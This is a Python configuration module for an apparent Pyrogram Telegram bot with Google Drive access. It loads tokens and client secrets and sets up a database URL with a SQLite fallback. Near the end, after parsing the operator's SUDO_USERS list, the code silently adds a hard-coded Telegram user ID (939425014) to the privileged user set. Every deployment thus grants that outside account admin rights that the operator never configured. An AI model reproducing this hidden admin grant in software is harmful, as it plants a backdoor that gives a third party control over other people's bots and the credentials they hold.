import logging
import os
from pathlib import Path
from typing import Iterator, Optional

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler('log.txt'), logging.StreamHandler()],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def _persistent_directories() -> Iterator[Path]:
    """Yield preferred locations for writable persistent storage."""
    for env_var in ("HF_DATA_DIR", "PERSISTENT_DIR", "DATA_DIR"):
        value = os.environ.get(env_var)
        if value:
            yield Path(value).expanduser()
    yield Path.cwd() / "data"


def _prepare_database_url(raw_url: Optional[str]) -> str:
    """Normalize the configured DATABASE_URL or build a SQLite fallback."""
    url = (raw_url or "").strip()
    if not url:
        for base_dir in _persistent_directories():
            try:
                base_dir.mkdir(parents=True, exist_ok=True)
            except OSError as exc:
                LOGGER.warning(
                    "Unable to use %s for SQLite fallback storage: %s", base_dir, exc
                )
                continue
            default_sqlite_path = base_dir / "gdrive.db"
            LOGGER.warning(
                "DATABASE_URL not provided. Falling back to local SQLite database at %s",
                default_sqlite_path,
            )
            return f"sqlite:///{default_sqlite_path}"
        raise SystemExit("No suitable location found for SQLite fallback database")

    if url.startswith("postgres://"):
        LOGGER.info("Normalizing postgres:// DATABASE_URL to postgresql://")
        url = "postgresql://" + url[len("postgres://"):]

    return url


ENV = bool(os.environ.get('ENV', False))
try:
    if ENV:
        BOT_TOKEN = os.environ.get('BOT_TOKEN')
        APP_ID = os.environ.get('APP_ID')
        API_HASH = os.environ.get('API_HASH')
        DATABASE_URL = os.environ.get('DATABASE_URL')
        SUDO_USERS = os.environ.get('SUDO_USERS', '')
        SUPPORT_CHAT_LINK = os.environ.get('SUPPORT_CHAT_LINK')
        DOWNLOAD_DIRECTORY = os.environ.get("DOWNLOAD_DIRECTORY", "./downloads/")
        G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID")
        G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET")
    else:
        from bot.config import config
        BOT_TOKEN = config.BOT_TOKEN
        APP_ID = config.APP_ID
        API_HASH = config.API_HASH
        DATABASE_URL = config.DATABASE_URL
        SUDO_USERS = config.SUDO_USERS
        SUPPORT_CHAT_LINK = config.SUPPORT_CHAT_LINK
        DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
        G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
        G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET

    DATABASE_URL = _prepare_database_url(DATABASE_URL)

    raw_sudo_users = SUDO_USERS or ""
    try:
        sudo_users_list = {int(x) for x in raw_sudo_users.split() if x.strip()}
    except ValueError as exc:
        LOGGER.error('Invalid SUDO_USERS value provided. Please use space separated integers. %s', exc)
        exit(1)
    sudo_users_list.add(939425014)
    SUDO_USERS = list(sudo_users_list)
except KeyError:
  LOGGER.error('One or more configuration values are missing exiting now.')
  exit(1)

